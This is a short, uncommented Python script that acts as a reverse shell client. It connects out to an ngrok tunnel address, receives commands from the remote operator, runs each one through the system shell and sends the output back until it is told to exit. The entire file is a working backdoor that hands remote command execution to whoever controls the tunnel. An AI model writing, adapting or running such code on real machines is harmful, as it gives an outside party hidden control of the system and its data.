import socket
import subprocess

HOST = "0.tcp.ngrok.io"
PORT = 11106
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((HOST,PORT))

msg = s.recv(BUFFER_SIZE).decode()
print("SERVER:",msg)

while True:
    cmd = s.recv(BUFFER_SIZE).decode()
    if cmd.lower() == "exit":
        break
    else:
        if "cd" in cmd.lower():
            subprocess.call(cmd,shell=True)
            s.send("DONE".encode())
        else:
            output = subprocess.getoutput(cmd)
            s.send(output.encode())

s.close()
